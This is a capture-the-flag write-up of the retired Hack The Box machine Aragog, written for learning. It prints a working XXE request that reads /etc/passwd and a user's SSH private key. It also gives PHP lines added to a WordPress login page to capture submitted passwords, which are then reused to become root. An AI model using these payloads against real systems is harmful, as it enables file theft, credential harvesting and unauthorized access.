---
layout: post
title: "The Spider Reads Your Mail"
subtitle: "HTB Aragog, where an XML form coughs up a private key, and a patient root keeps rebuilding the very page you booby-trapped"
date: 2018-07-28 12:00:00 +0000
description: "An XML parser that fetches any file you name leaks an SSH key, then a root cron that endlessly restores a world-writable WordPress hands you the admin's password on a timer."
image: /assets/og/the-spider-reads-your-mail.png
tags: [hackthebox, writeup]
---

Aragog is named for the spider in the cupboard, and it plays like one. It sits very still in a web of its own making and waits for something to walk in. The first thread is an XML form that politely fetches any file you name, including the private key to somebody's front door. The second thread is the cleverest trap on the box, except the trap is set for you. A root process rebuilds a WordPress site every few minutes, and an admin logs into that site like clockwork, so you poison the page, wait for the admin to type their password into your version of it, and watch the spider hand you the web. Nothing here is forced. Two services oversharing, one human on a schedule, and patience.

```
        A R A G O G
        ===========
        POST /hosts.php   "tell me a subnet"
              <subnet_mask>&xxe;</subnet_mask>
                     |   the parser fetches whatever file you name
                     v
        florian's id_rsa falls out of the form.

        then: a root cron rebuilds the wiki on a timer,
        an admin logs in on a timer,
        and the page they trust is now your page.
                                            蛛
```

## 0x01 · three doors and a hint

Three ports answer, and the shape is friendly. `nmap -sC -sV` paints an Ubuntu box wearing nothing exotic.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

FTP allows anonymous login, and that is the first thread to pull. Inside is a single file, `test.txt`, and it is not flag bait. It is a sample of XML, a little blob with a `subnet_mask` field and a `details` wrapper. A stray document like that is the box leaning in and whispering what shape of input something elsewhere is hungry for. Hold the structure in your head, because the web server is about to ask for exactly it.

A quick directory sweep with `gobuster` against port 80 turns up `/hosts.php`, a page that does subnet math. Feed it the XML shape from `test.txt` over POST, and it dutifully parses your document and echoes a field back. Any time a server parses XML you hand it and reflects part of that document to your screen, your ears should prick up. That reflection is a window, and XML has a notorious way of pointing windows at files they were never meant to show.

## 0x02 · the form that fetches anything

The bug is XXE, XML External Entity injection, and it is one of the cleaner ones to demonstrate. XML lets a document define its own shorthand words, called entities, near the top. Most entities just stand in for a chunk of text. But an external entity can be defined as the *contents of a file*, and a parser that obeys those will go read the file off disk and paste it in wherever the shorthand appears.

Think of it like a form with a fill-in-the-blank that says "write your answer here," and below it, in fine print, "or if you'd rather, just name a book on my shelf and I'll copy a page out of it for you." You were supposed to type a subnet mask. Instead you name a file on the server's own shelf, and the server reads it back to you out loud.

You declare an entity that points at a file, then drop that entity into the field the page echoes.

```
POST /hosts.php HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<details>
  <subnet_mask>&xxe;</subnet_mask>
  <test></test>
</details>
```

Where the page expected a netmask, `&xxe;` expands to the whole of `/etc/passwd`, and the response hands it back. Two interactive users fall out, `florian` and `cliff`. The root cause underneath is the parser being told to honor external entities (the old `libxml_disable_entity_loader(false)` foot-gun with `LIBXML_NOENT`), which is a default that should have died a long time ago.

Once a parser will read any file you name, the only question left is which file is worth the most. The answer on a Linux box is almost always the same.

```
<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa">
```

The form coughs up a private SSH key. The window the server opened onto its own filesystem just framed the one file that is a literal key to the front door.

## 0x03 · the key was lying on the shelf

A private key is a login that skips the password entirely. Save florian's key, lock down its permissions so SSH will accept it, and walk in.

```
$ chmod 600 id_florian
$ ssh -i id_florian florian@10.10.10.78
florian@aragog:~$ id
uid=1000(florian) gid=1000(florian) groups=1000(florian)
florian@aragog:~$ cat user.txt
████████████████████████████████
```

No exploit ran. A document-parsing form read a secret file and read it aloud, and the secret file happened to be a key. That is the whole of the foothold, and it is worth sitting with how little force it took.

## 0x04 · watching the clock

florian is an ordinary user, so the next move is to learn what the box does when nobody is looking. The most honest way to see that is `pspy`, a tiny tool that watches the process table without needing root, so short-lived jobs that fire and vanish still leave a fingerprint you can read. Picture a hidden camera pointed at a hallway. You do not need a key to any room. You just need to see who walks through and how often.

Upload it, run it, and a pattern surfaces on a timer. A root-owned process keeps re-running a restore script, and on a separate beat, a login flow keeps hitting a WordPress install. Two clocks, both ticking on their own, and between them they do all the work.

```
$ ./pspy64
...
CMD: UID=0    | /bin/bash /root/restore.sh
CMD: UID=0    | cp -R /var/www/html/zz_backup/ /var/www/html/dev_wiki/
CMD: UID=1001 | python /home/cliff/wp-login.py
```

There is a WordPress site at `/var/www/html/dev_wiki/` that nobody linked from the front page. The restore script, owned by root, wipes that directory and copies a fresh backup over it every few minutes, then sets it world-writable.

```
# /root/restore.sh
rm -rf /var/www/html/dev_wiki/
cp -R /var/www/html/zz_backup/ /var/www/html/dev_wiki/
chown -R cliff:cliff /var/www/html/dev_wiki/
chmod -R 777 /var/www/html/dev_wiki/
```

That `chmod -R 777` is the hinge of the whole box. Root, on a schedule, is making a directory full of code that anyone can edit. And cliff's script logs into that exact site every minute. So the page is writable by us, and a privileged user keeps typing their password into it. The trap practically describes itself.

## 0x05 · poison the page, wait for the visitor

The plan is patient and a little mean to the technology. WordPress reads your password on its login page. If you edit that login page, you can read the password too, right as it arrives, before WordPress hashes it away. Think of it like a hotel front desk where the guestbook is bolted down but anyone can swap the pen for one that quietly carries a second copy of every signature onto a hidden carbon sheet underneath.

Because the wiki is restored on a timer, you cannot edit it once and walk away. The clock will erase your change. You edit it just after a restore and let the next login land in your window before the following restore wipes it. So you append a few lines to the login handler that write whatever credentials arrive into a file you can read.

```
// appended to dev_wiki/wp-login.php, just after the POST arrives
file_put_contents(
  '/var/www/html/dev_wiki/wp-content/uploads/iceberg.txt',
  $_POST['log'].' : '.$_POST['pwd']."\n",
  FILE_APPEND
);
```

This is not a webshell. It does not run commands and it does not call anything home. It is a sticky note taped under the keyboard, and that is exactly why it is enough. Drop the lines in, wait a minute for cliff's login script to fire, and read your file.

```
florian@aragog:~$ cat /var/www/html/dev_wiki/wp-content/uploads/iceberg.txt
Administrator : !KRgYs(JFO!&MTr)lf
```

There it is, in the clear. The page the admin trusted was, for one minute, the page you wrote.

## 0x06 · the password did two jobs

A WordPress admin password is, on its own, just a way into a blog. It only becomes root because of the oldest habit in computing. Someone reused it. The string cliff types into WordPress is also a real system password, so it walks straight from the login form to a shell prompt.

```
florian@aragog:~$ su - 
Password: !KRgYs(JFO!&MTr)lf
root@aragog:~# id
uid=0(root) gid=0(root) groups=0(root)
root@aragog:~# cat /root/root.txt
████████████████████████████████
```

Same string, two locks. The blog password was the bank password. That is the quiet hinge the whole back half of the box swings on, and it cost the defender everything.

## 0x07 · the honest caveat

It is tempting to read Aragog as two unrelated tricks, an old XML bug up front and a config slip at the back, and to file both under "patched, irrelevant, fixed years ago." But look at what actually beat the box, because neither half is really about a missing patch.

The XXE is an oversharing bug, the same family as the file-reading flaws that still surface in document parsers, office formats, and SVG uploads every single year. A parser was told to honor external entities, so it treated "name a file" as a valid answer to "type a subnet." The fix is not a CVE number. It is the unglamorous discipline of turning external entities off by default and refusing to let a data format reach off the page and pull a file off the disk. Every XXE is the same confession. A document was supposed to carry information, and somebody let it carry instructions instead.

The privesc is scarier, because nothing there was unpatched at all. It shipped green. A root cron rebuilding a directory and stamping it `777` is documented behavior doing precisely what it was told, and there is no update that fixes a thoughtless `chmod`. The real wound is the chain of small trusts. Root trusted a world-writable web root. A privileged user trusted a page anyone could rewrite. And one password trusted itself to guard two different doors. You can `apt upgrade` the OpenSSH and the Apache all day. You cannot patch a `777` you chose, an admin who logs in on a timer, or a password used twice. Those get fixed by paranoia, or they do not get fixed.

## 0x08 · outro

```
the form read a file aloud, and the file was a key.
a root clock kept rebuilding a page anyone could edit.
an admin kept typing a password into your version of it.
the password opened a second lock because it was lazy with one.

no exploit forced this open. the box just oversharing, on a timer.

turn off the entities. mind the 777. never reuse the key. wear black.

                                                            EOF
```

---

*HTB: Aragog, retired 21 Jul 2018. A medium Linux box that is really a lecture on XXE up front and a world-writable cron at the back, with one reused password tying the bow. The spider never moved. It just waited for the admin to walk in.*